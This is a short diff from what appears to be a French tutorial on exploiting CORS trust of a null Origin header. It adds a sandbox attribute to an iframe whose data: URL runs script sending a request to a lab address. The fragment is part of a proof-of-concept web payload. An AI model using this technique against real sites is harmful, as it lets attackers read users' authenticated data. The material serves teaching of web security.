@@ -13,7 +13,7 @@ La solution pour avoir un entête `Origin` possédant une valeur `null` est d'ut
   </head>
 
   <body>
-    <iframe src="data:text/html,
+    <iframe sandbox="allow-scripts" src="data:text/html,
       <script>
         var xhr=new XMLHttpRequest();
         xhr.open('GET', 'http://192.168.56.184/null_origin.php', true);
